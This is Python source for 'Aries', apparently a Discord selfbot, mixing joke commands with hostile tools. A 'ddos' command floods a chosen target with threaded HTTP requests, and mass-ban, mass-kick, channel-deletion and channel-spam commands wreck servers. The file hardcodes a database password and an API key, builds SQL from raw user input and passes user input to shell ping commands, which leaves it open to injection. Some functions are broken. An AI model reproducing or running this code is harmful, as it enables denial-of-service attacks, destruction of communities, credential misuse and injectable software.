    embed = discord.Embed(title= config.get('title'), description = f"Sounds For Sniper Are: {value}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def availablethemes(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    
    embed = discord.Embed(title= "Aries Theme", description = f"Themes you can Install:\nMidnight\nShootingStar", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def howgay(ctx, user: discord.User):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    gay = random.randrange(1, 100)
    if gay > 50:
        isgay = "Gay!"
    else:
        isgay = "Straight"
    gay2 = str(gay) + "%"
    embed = discord.Embed(title= f"I've determined hes {isgay}", description = f"{user} is {gay2} gay!", color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/790796610388492299/898081227880423424/Z.png")
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def dicksize(ctx, user: discord.User):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    dongs = "8{}D".format("=" * random.randint(0, 30))
    if len(dongs) < 15:
        issmall = "I CANT SEE IT"
    else:
        issmall = "ITS HUGE"
    embed = discord.Embed(title= f"Ive determined: {issmall}", description = f"{user}'s' Dick is {dongs}", color=readableHex)
    embed.set_thumbnail(url = "https://c.tenor.com/GeFTyQnfPR0AAAAM/penis-standing-erect.gif")
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def custompres(ctx, message):
    await ctx.message.delete()
    for i in range(len(message)):
        await bot.change_presence(activity=discord.CustomActivity(name=message[:i+1] ,emoji='🖥️'))
        await asyncio.sleep(0.4)
@bot.command()
async def uptime(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    global start_time
    end_time = datetime.now()
    embed = discord.Embed(title= config.get('title'), description = 'Time Since Start: {}'.format(end_time - start_time), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def evenorodd(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= config.get('title'), description = 'You have 10 seconds to guess even or odd!', color=readableHex)
    embed2 = discord.Embed(title= config.get('title'), description = str(random.randrange(0, 999)), color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif")
    embed.set_footer(text = "made with ♡ by bomt")
    embed2.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif")
    embed2.set_footer(text = "made with ♡ by bomt")
    msg = await ctx.send(embed = embed)
    sleep(10)
    await msg.edit(embed = embed2)
@bot.command()
async def steppingstones(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    fall = ["You Fell!", "Your Safe!", "You Fell!", "Your Safe!", "You Fell!", "Your Safe!", "You Fell!", "Your Safe!"]
    embed = discord.Embed(title= config.get('title'), description = 'You Jumped! Did you fall? (wait 5 seconds)', color=readableHex)
    embed2 = discord.Embed(title= config.get('title'), description = str(random.choice(fall)), color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif")
    embed.set_footer(text = "made with ♡ by bomt")
    embed2.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif")
    embed2.set_footer(text = "made with ♡ by bomt")
    msg = await ctx.send(embed = embed)
    sleep(5)
    await msg.edit(embed = embed2)
def animate_Rocket():
    distanceFromTop = 20
    isdone = False
    while True and isdone == False:
        print("\n" * distanceFromTop)
        print("          /\        ")
        print("        .'  '.        ")
        print("       /======\       ")
        print("      ;:.  _   ;       ")
        print("      |:. (_)  |")
        print("      |:.  _   |")
        print("      |:. (_)  |")
        print("      ;:.      ;")
        print("    .' \:.    / `.")
        print("   / .-'':._.'`-. \   ")
        print("   |/    /||\    \|")

        sleep(0.2)
        os.system('cls' if os.name == 'nt' else 'clear')  
        distanceFromTop -= 1
        if distanceFromTop <0:
            isdone = True
            global nitro_sniper_config
            global version
            global prefix
            global copier
            global selfbot_detector_config
            os.system('cls' if os.name == 'nt' else 'clear')
            global ctu
            print(f"                                                   ___         _          ")
            print(f"                                                  /   |  _____(_)__  _____")
            print(f"                                                 / /| | / ___/ / _ \/ ___/")
            print(f"                                                / ___ |/ /  / /  __(__  ) ")
            print(f"                                               /_/  |_/_/  /_/\___/____/  ")
            print(Fore.RESET + "\n\n                                             Ram the opposition with Aries")
            print("\n" + Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + command_amount + Fore.RESET + "Commands!")
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "User Is In » " + Fore.LIGHTCYAN_EX + str(len(bot.guilds))  + Fore.RESET + " Guilds!")
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Build » " + Fore.LIGHTCYAN_EX + version + Fore.RESET)
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Prefix » " + Fore.LIGHTCYAN_EX + str(prefix) + Fore.RESET)
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Sniper » " + Fore.LIGHTCYAN_EX + str(nitro_sniper_config) + Fore.RESET)
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Selfbot Detector » " + Fore.LIGHTCYAN_EX + str(selfbot_detector_config) + Fore.RESET)
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Copycat » " + Fore.LIGHTCYAN_EX + str(copier) + Fore.RESET)
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.GREEN + " Connected! Enjoy Aries " + Fore.RESET + f"{bot.user}" + Fore.RESET)     
            print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.BLUE + " (Please Note that your token is safe and is only stored in a json file) " + Fore.RESET)
@bot.command()
async def rocket(ctx):
    distanceFromTop = 20
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
#     /\        
#     ||       
#     ||       
#    /||\
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    animate_Rocket()
@bot.command()
async def typewrite(ctx, delay: int, *, message):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    msg = await ctx.send(message[0])
    for i in range(len(message)):
        await msg.edit(content=message[:i+1])
        await asyncio.sleep(delay)
@bot.command()
async def convertvideo(ctx, videolink):
    await ctx.message.delete()
    def convert(path):
        yt = YouTube(videolink)
        yt = yt.streams.filter(progressive=True, file_extension='mp4').order_by('resolution').desc().first()
        if not os.path.exists(path):
            os.makedirs(path)
        yt.download(path)

    convert(str(os.getcwd()) + "/youtubeconverter")

    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= config.get('title'), description = f"Downloaded Video: {videolink} as mp4 to where Aries is!", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def iq(ctx, user: discord.User):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= config.get('title'), description = f"{user}'s IQ is: {random.randrange(1, 100)}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def insult(ctx, user: discord.User):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    insults = ["Light travels faster than sound, which is why you seemed bright until you spoke.", "You have so many gaps in your teeth it looks like your tongue is in jail.", "Hold still. I’m trying to imagine you with a personality.", "Don’t be ashamed of who you are. That’s your parents’ job.", "You are the human version of period cramps.", "If you’re going to be two-faced, at least make one of them pretty.", "You are like a cloud. When you disappear, it’s a beautiful day.", "OH MY GOD! IT SPEAKS!", "You just might be why the middle finger was invented in the first place.", "I guess if you actually ever spoke your mind, you’d really be speechless."]
    embed = discord.Embed(title= config.get('title'), description = f"{user} {random.choice(insults)}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def whois(ctx, website):
     await ctx.message.delete()
     ipv4 = socket.gethostbyname(f'{website}')
     obj = IPWhois(f'{ipv4}')
     objstring = str(obj.lookup_whois())
     with open(f"./data/themes/{theme_config}.json") as f:
        config = json.load(f)
        color = config.get('color')
        sixteenIntegerHex = int(color.replace("#", ""), 16)
        readableHex = int(hex(sixteenIntegerHex), 0)
        embed = discord.Embed(title= config.get('title'), description = f"{objstring}", color=readableHex)
        embed.set_thumbnail(url = config.get('imageurl'))
        embed.set_footer(text = "made with ♡ by bomt")
        await ctx.send(embed = embed)
@bot.command()
async def question(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    eightballs = ["for sure!", "yeah", "yes", "ok", "no", "i wouldnt advise", "ask agian", ""]
    embed = discord.Embed(title= config.get('title'), description = f"{random.choice(eightballs)}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def servericon(ctx):
    icon_url = ctx.guild.icon_url
    with open(f"./data/themes/{theme_config}.json") as f:
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= config.get('title'), description = f"Server Icon", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_image(url = f"{icon_url}")
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def banrecord(ctx):
    await ctx.message.delete()
    bans = await ctx.guild.bans()
    loop = [f"{u[1]} ({u[1].id})" for u in bans]
    _list = "\r\n".join([f"[{str(num).zfill(2)}] {data}" for num, data in enumerate(loop, start=1)])
    with open("./data/bans.json", "w") as f:
        f.write(json.dumps(f'{_list}', indent=2))
@bot.command()
async def listbans(ctx, *, reason=None):
    bans = await ctx.guild.bans()
    loop = [f"{u[1]} ({u[1].id})" for u in bans]
    _list = "\r\n".join([f"[{str(num).zfill(2)}] {data}" for num, data in enumerate(loop, start=1)])
    await ctx.send(f"```ini\n{_list}```")
@bot.command()
async def banall(ctx, *, reason=None):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f: 
     config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    try:
      members = ctx.guild.members
      members.remove(ctx.me)
      for member in members:
       await member.ban(reason = reason)
    except Exception as e:
     print(e)
@bot.command()
async def kickall(ctx, *, reason=None):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f: 
     config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    try:
      members = ctx.guild.members
      members.remove(ctx.me)
      for member in members:
       await member.kick(reason = reason)
    except Exception as e:
     print(e)
@bot.command()
async def register(ctx, Username, Password):
    cnx = mysql.connect(user='epiz_30428895', password='2QT1FBqfzI8g1y',
                              host='sql310.epizy.com',
                              database='epiz_30428895_db_school',
                              use_pure=False)
    mySql_insert_query = f"""INSERT INTO tb_student (Username, Password) 
                           VALUES 
                           ({Username}, {Password}) """

    cursor = mysql.cursor()
    cursor.execute(mySql_insert_query)
    mysql.commit()
    print(cursor.rowcount, "Record inserted successfully into Laptop table")
    cursor.close()
    cnx.close()
@bot.command()
async def cls(ctx, *, reason=None):
    await ctx.message.delete()
    os.system('cls' if os.name == 'nt' else 'clear')
    print("Cleared!")
    await asyncio.sleep(5)
    global nitro_sniper_config
    global version
    global prefix_config
    global copier
    global selfbot_detector_config
    os.system('cls' if os.name == 'nt' else 'clear')
    global ctu
    print(f"                                                   ___         _          ")
    print(f"                                                  /   |  _____(_)__  _____")
    print(f"                                                 / /| | / ___/ / _ \/ ___/")
    print(f"                                                / ___ |/ /  / /  __(__  ) ")
    print(f"                                               /_/  |_/_/  /_/\___/____/  ")
    print(Fore.RESET + "\n\n                                             Ram the opposition with Aries")
    print("\n" + Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + command_amount + Fore.RESET + "Commands!")
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "User Is In » " + Fore.LIGHTCYAN_EX + str(len(bot.guilds))  + Fore.RESET + " Guilds!")
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Build » " + Fore.LIGHTCYAN_EX + version + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Prefix » " + Fore.LIGHTCYAN_EX + str(prefix_config) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Sniper » " + Fore.LIGHTCYAN_EX + str(nitro_sniper_config) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Selfbot Detector » " + Fore.LIGHTCYAN_EX + str(selfbot_detector_config) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Copycat » " + Fore.LIGHTCYAN_EX + str(copier) + Fore.RESET)
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.GREEN + " Connected! Enjoy Aries " + Fore.RESET + f"{bot.user}" + Fore.RESET)     
    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.BLUE + " (Please Note that your token is safe and is only stored in a json file) " + Fore.RESET)   
@bot.command()
async def grabsiteip(ctx, website):    
    websiteip = socket.gethostbyname(f'{website}')
    config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries SiteIP Grabber", description = f"IP: {websiteip}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)    
@bot.command()
async def ddos(ctx, threads, target):
    fake_ip = '182.21.20.32'
    port = 80
    bytes = random._urandom(1490)
    def attack():
     while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + bytes + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except Exception:
            pass
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:

    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    for i in range(int(threads)):
        thread = threading.Thread(target=attack)
        thread.start()
    embed = discord.Embed(title= "Aries DDoS Attack", description = f"DDoSing: + {target}".encode('ascii'), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)    
@bot.command()
async def support(ctx):
    channel = bot.get_channel(911101764185493557)
    try:
        message = await channel.send('!new') 
        await message.delete()
    except Exception:
        with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
            config = json.load(f)
        color = config.get('color')
        sixteenIntegerHex = int(color.replace("#", ""), 16)
        readableHex = int(hex(sixteenIntegerHex), 0)
        embed = discord.Embed(title= "Aries Support", description = f"Error | You aren't in Aries Server - https://discord.gg/eaGRnxZj7r", color=readableHex)
        embed.set_thumbnail(url = config.get('imageurl'))
        embed.set_footer(text = "made with ♡ by bomt")
        await ctx.send(embed = embed)
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Support", description = f"Contacted Aries Support In the Aries Server. Check your ticket in Aries!", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def pingweb(ctx, website):
    try:
        websiteip = socket.gethostbyname(f'{website}')
        msg = None
        pingit = "-n 1"
        status = os.popen("ping " + pingit + " " + websiteip).read()
        if "TTL" in status: 
            msg = f"Website: {website} is UP"
        else:
            msg = f"Website: {website} is DOWN"
    except Exception as e:
        msg = f"Website: {website} is DOWN"
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Pinger", description = f"Pinging: + {website}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")

    embed1 = discord.Embed(title= "Aries Pinger", description = f"{msg}", color=readableHex)
    embed1.set_thumbnail(url = config.get('imageurl'))
    embed1.set_footer(text = "made with ♡ by bomt")

    msg1 = await ctx.send(embed = embed) 
    sleep(1)
    await msg1.edit(embed = embed1)
@bot.command()
async def pingip(ctx, ip):
    msg = None
    pingit = "-n 1"
    status = os.popen("ping " + pingit + " " + ip).read()
    if "TTL" in status: 
        msg = f"IP: {ip} is UP"
    else:
        msg = f"IP: {ip} is DOWN"

    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Pinger", description = f"Pinging: + {ip}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")

    embed1 = discord.Embed(title= "Aries Pinger", description = f"{msg}", color=readableHex)
    embed1.set_thumbnail(url = config.get('imageurl'))
    embed1.set_footer(text = "made with ♡ by bomt")

    msg1 = await ctx.send(embed = embed) 
    sleep(1)
    await msg1.edit(embed = embed1)
@bot.command()
async def afk(ctx, args):
    await ctx.message.delete()
    global afkmode
    args1 = str(args)
    args2 = args1.replace("t", "T")
    data = {
        "token": f"{token_config}",
        "prefix": f"{prefix_config}",
        "sniper": f"{nitro_sniper_config}",
        "detector": f"{selfbot_detector_config}",
        "theme": f"{theme_config}",
        "AFK": f"{args2}",
        "AFK-Message": f"{afkmsg_config}",
        "Fake-Nitro": f"{fake_nitro_config}"
    }
    with open(f"./data/config.json", "w") as f:
        f.write(json.dumps(data, indent=4))
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries AFK Mode", description = f"Set AFK To: + {afkmode_config}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed) 
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def unban(ctx, id: int):
    user = await bot.fetch_user(id)
    await ctx.guild.unban(user)
    with open(f"./data/themes/{theme_config}.json") as f:
     config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries AFK Mode", description = f"Unbanned: {user}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def iplookup(ctx, ip):
    #Ip Info using ipapi
    info = ipapi.location(ip=ip)    
    await ctx.message.delete()
    with open(f"./data/themes/{theme_config}.json") as f:
     config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries IPLookup Mode", description = f"Country: {info['country_name']}\nCity: {info['city']}\nTimezone: {info['timezone']}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def delchannels(ctx):
    for c in ctx.guild.channels: # iterating through each guild channel
        await c.delete()
@bot.command()
async def createchannels(ctx):
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    try:
      guild = ctx.guild
	  #channel = await guild.create_text_channel(channel_name)
      for i in range(70):
       await guild.create_text_channel("Aries on TOP")
      embed = discord.Embed(title=config.get('title'), description = "Created " + "Successfully", color=readableHex)    
      embed.set_thumbnail(url = config.get('imageurl'))
      await ctx.send(embed = embed) 
    except commands.MissingPermissions:
     embed = discord.Embed(title=config.get('title'), description = "Error | Insufficient Perms!", color=readableHex)    
     embed.set_thumbnail(url = config.get('imageurl'))
     await ctx.send(embed = embed) 
@bot.command()
async def changelog(ctx):
    global ctu
    print(f"""
            {Fore.GREEN}Green = Added
            {Fore.YELLOW}Yellow = Fixed
            {Fore.RED}Red = Removed {Fore.RESET}
    ------------------------------------------------------------------------------------------------------------------------

            {Fore.GREEN}Commands »                                      {Fore.GREEN}Features »                                      {Fore.GREEN}GUI »
            
            Added Changelog Command                         New(er) NitroSniper                             New(er) GUI
            Added Polls                                     AFK Mode                                        New Settings GUI
            Added Spamreaction                              Selfbot Detector                                New Exit Buttons
            Added CPU Command                                                                               Fixed GUI Loading Bugs
            Added IPLookup                                  
            {Fore.YELLOW}                                   
                                                            Fixed Login Time Bugs
                                                            Fixed GUI Bugs
            Fixed All Help/Info Menus                       Fixed Nitro Sniper Timing
            Fixed 12 Commands                               Fixed Nitro Sniper Auto-Redeem
            Fixed StealPFP and Avatar
    
    
    
    """)
@bot.command()
async def ecb64(ctx, *, text):
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    #Store Message to Encode 
    message = text
    #Convert to Bytes like Object using Strings encode method
    message_bytes = message.encode('ascii')
    #Encode using base64
    base64_bytes = base64.b64encode(message_bytes)
    #Make it a String
    base64_message = base64_bytes.decode('ascii')
    embed = discord.Embed(title=config.get('title'), description = f"Decoded: {text}\nEncoded: {base64_message}", color=readableHex)    
    embed.set_thumbnail(url = config.get('imageurl'))
    await ctx.send(embed = embed) 

@bot.command()
async def dcb64(ctx, text):
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    base64_message = text
    #Make it a bytes like object
    base64_bytes = base64_message.encode('ascii')
    #Decoode base64 Bytes
    message_bytes = base64.b64decode(base64_bytes)
    #Decode into String object
    message = message_bytes.decode('ascii')
    #Send it
    embed = discord.Embed(title=config.get('title'), description = f"Encoded: {text}\nDecoded: {message}", color=readableHex)    
    embed.set_thumbnail(url = config.get('imageurl'))
    await ctx.send(embed = embed) 
@bot.command()
async def serveremojis(ctx):
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    for emoji in ctx.guild.emojis:
        embed = discord.Embed(title=config.get('title'), description = f"This Server Has: {emoji.name}", color=readableHex)    
        embed.set_thumbnail(url = config.get('imageurl'))
        await ctx.send(embed = embed) 
@bot.command()
async def codeblock(ctx, mode, *, text):
    #TODO Add more
    if ("Normal" in mode):
        await ctx.send(f'```{text}```')
    elif "Java" in mode:
        text = f'```java\n{text}\n```'
        await ctx.send(text)
    elif "css" in mode:
        text = f'```css\n{text}\n```'
        await ctx.send(text)
@bot.command()
async def ascii(ctx, *, text):
    with open(f"./data/themes/{theme_config}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    #`
    asciiart = text2art(text)
    await ctx.send(f'```{asciiart}```')
@bot.command()
async def stealpfp(ctx, user: discord.User = None):
    isdone = False
    #Saves Avatar
    await user.avatar_url_as(format="png").save(fp=f"ariespfpgrabber.png")
    #Gets the path to where it saves the Avatar
    pfp_path = str(os.getcwd() + "/ariespfpgrabber.png")
    #Opens Image
    fp = open(pfp_path, 'rb')
    #Reads it
    pfp = fp.read()
    #Tries to set it
    try:
     await bot.user.edit(avatar = pfp) 
     isdone = True
     #Catches any Exceptions found
    except Exception:
     #If found print error
     print("Error Setting PFP")
     pass
     #Delete
     if isdone == True:
      try:
       os.remove((str(os.getcwd() + "/ariespfpgrabber.png")))
       isdone == False
      #Catches deleting Exception
      except Exception:
        print("Error")
        pass
@bot.command()
async def checkban(ctx, uuid, banid):
    await ctx.message.delete()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "XF-Api-Key": "bjtcSJf7RBLifkPVxFtexqAQOvpxOUE9"
    }
    resp = requests.get(f"https://hypixel.net/api/players/{uuid}/ban/{banid}", headers=headers)
    respstr = str(resp.text)
    print(respstr)
    print("--------------------------Overall--------------------------")
    if ("Ban" or "ban" in respstr):
        print(f"{Fore.RED}Banned = Yes")
    if ("Cheating through the use of unfair game advantages." in respstr):
        print(f"{Fore.RED}Staff Ban = Yes")
    with open(f"./data/themes/{theme_config}.json") as f:
     config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title=config.get('title'), description = f"{respstr}", color=readableHex)    
    embed.set_thumbnail(url = config.get('imageurl')) 
    await ctx.send(embed = embed) 
    #print(resp.text)
@bot.command()
async def cpu(ctx):
    #Get Amount of Used CPU
    cpu1 = round(psutil.cpu_percent(),1)
    #Loads the json to read contents
    with open(f"./data/themes/{theme_config}.json") as f:
     config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title=config.get('title'), description = f"CPU Info: {platform.processor()}\nCPU Usage: {cpu1}", color=readableHex)    
    embed.set_thumbnail(url = config.get('imageurl')) 
